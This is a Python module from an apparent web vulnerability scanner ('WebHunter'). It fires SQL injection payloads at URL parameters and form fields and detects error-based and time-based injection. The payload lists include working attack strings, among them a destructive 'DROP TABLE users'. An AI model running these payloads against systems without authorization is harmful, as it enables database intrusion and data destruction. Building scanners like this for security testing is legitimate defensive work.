#!/usr/bin/env python3
"""
WebHunter - SQL Injection Scanner Module
"""

import re
import time
from core.logger import HunterLogger
from core.engine import Vulnerability
from core.utils import make_request, inject_payload_in_params, extract_forms, delay

log = HunterLogger("SQLi")


class SQLiScanner:
    """SQL Injection vulnerability scanner"""

    def __init__(self, target, engine):
        self.target = target
        self.engine = engine
        self.findings = []

        # Error-based SQLi payloads
        self.error_payloads = [
            "'", "\"", "'--", "\"--", "' OR '1'='1", "\" OR \"1\"=\"1",
            "' OR 1=1--", "\" OR 1=1--", "' OR '1'='1'--",
            "1' ORDER BY 1--", "1' ORDER BY 100--",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "1; DROP TABLE users--", "' AND 1=CONVERT(int,@@version)--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "') OR ('1'='1", "admin' --", "admin'/*",
            "' OR ''='", "1' AND '1'='1", "1' AND '1'='2",
            "' HAVING 1=1--", "' GROUP BY id HAVING 1=1--",
            "'; WAITFOR DELAY '0:0:5'--",
        ]

        # SQL error patterns
        self.sql_errors = [
            r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySqlException",
            r"valid MySQL result", r"check the manual that corresponds to your MySQL",
            r"MySqlClient\.", r"com\.mysql\.jdbc",
            r"ORA-\d{5}", r"Oracle.*Driver", r"Warning.*oci_",
            r"Microsoft.*ODBC.*SQL Server", r"SQLServer JDBC Driver",
            r"Microsoft.*SQL.*Server.*Error", r"MSSQL.*Driver",
            r"PostgreSQL.*ERROR", r"Warning.*pg_", r"valid PostgreSQL result",
            r"Npgsql\.", r"PG::SyntaxError",
            r"SQLite.*error", r"sqlite3\.OperationalError",
            r"System\.Data\.SQLite\.SQLiteException",
            r"SQLITE_ERROR",
            r"SQL syntax.*", r"syntax error.*SQL", r"unclosed quotation mark",
            r"quoted string not properly terminated",
            r"DB2.*CLI.*Driver", r"CLI Driver.*DB2",
            r"Sybase.*error", r"Informix.*error",
        ]

    def scan(self):
        """Run SQL injection scan"""
        log.info(f"Testing SQL Injection on {self.target.url}")

        # Test URL parameters
        self._test_url_params()

        # Test forms
        self._test_forms()

        # Time-based blind SQLi
        self._test_time_based()

        return self.findings

    def _test_url_params(self):
        """Test URL parameters for SQLi"""
        resp = make_request(self.target.url)
        if not resp:
            return

        from core.utils import extract_links
        links = extract_links(resp.text, self.target.url)
        param_urls = [l for l in links if "?" in l]

        test_urls = param_urls[:20] if param_urls else []
        if "?" in self.target.url:
            test_urls.insert(0, self.target.url)

        for url in test_urls:
            for i, payload in enumerate(self.error_payloads):
                log.progress(i + 1, len(self.error_payloads), f"Testing: {payload[:30]}")
                injected = inject_payload_in_params(url, payload)

                for inj in injected:
                    r = make_request(inj["url"])
                    if r:
                        for pattern in self.sql_errors:
                            if re.search(pattern, r.text, re.IGNORECASE):
                                vuln = Vulnerability(
                                    title="SQL Injection - Error Based",
                                    severity="CRITICAL",
                                    description=f"SQL error detected when injecting payload in parameter '{inj['param']}'",
                                    url=inj["url"],
                                    param=inj["param"],
                                    payload=payload,
                                    evidence=re.search(pattern, r.text, re.IGNORECASE).group()[:200],
                                    remediation="Use parameterized queries/prepared statements. Implement input validation.",
                                    owasp_category="A03 - Injection",
                                    module="SQLi Scanner"
                                )
                                self.engine.add_vulnerability(vuln)
                                self.findings.append(vuln)
                                return  # Found - no need to continue
                    delay()

    def _test_forms(self):
        """Test forms for SQL injection"""
        resp = make_request(self.target.url)
        if not resp:
            return

        forms = extract_forms(resp.text, self.target.url)
        log.info(f"Testing {len(forms)} form(s) for SQL Injection")

        for form in forms:
            for payload in self.error_payloads[:10]:
                form_data = {}
                for inp in form["inputs"]:
                    if inp["type"] in ["text", "search", "email", "password", "hidden", "textarea"]:
                        form_data[inp["name"]] = payload
                    else:
                        form_data[inp["name"]] = inp["value"] or "test"

                if form["method"] == "POST":
                    r = make_request(form["action"], method="POST", data=form_data)
                else:
                    r = make_request(form["action"], method="GET", data=form_data)

                if r:
                    for pattern in self.sql_errors:
                        if re.search(pattern, r.text, re.IGNORECASE):
                            vuln = Vulnerability(
                                title="SQL Injection in Form - Error Based",
                                severity="CRITICAL",
                                description=f"SQL error detected in form at {form['action']}",
                                url=form["action"],
                                param=str(list(form_data.keys())),
                                payload=payload,
                                evidence=re.search(pattern, r.text, re.IGNORECASE).group()[:200],
                                remediation="Use parameterized queries. Validate all form inputs.",
                                owasp_category="A03 - Injection",
                                module="SQLi Scanner"
                            )
                            self.engine.add_vulnerability(vuln)
                            self.findings.append(vuln)
                            return
                delay()

    def _test_time_based(self):
        """Test for time-based blind SQL injection"""
        time_payloads = [
            "' OR SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR pg_sleep(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR BENCHMARK(10000000,SHA1('test'))--",
        ]

        if "?" not in self.target.url:
            return

        log.info("Testing time-based blind SQL injection...")

        for payload in time_payloads:
            injected = inject_payload_in_params(self.target.url, payload)
            for inj in injected:
                start = time.time()
                r = make_request(inj["url"], timeout=15)
                elapsed = time.time() - start

                if elapsed >= 4.5:
                    vuln = Vulnerability(
                        title="SQL Injection - Time Based Blind",
                        severity="CRITICAL",
                        description=f"Response delayed by {elapsed:.1f}s indicating time-based blind SQLi",
                        url=inj["url"],
                        param=inj["param"],
                        payload=payload,
                        evidence=f"Response time: {elapsed:.1f} seconds (expected delay: 5s)",
                        remediation="Use parameterized queries. Implement WAF rules.",
                        owasp_category="A03 - Injection",
                        module="SQLi Scanner"
                    )
                    self.engine.add_vulnerability(vuln)
                    self.findings.append(vuln)
                    return

        return self.findings
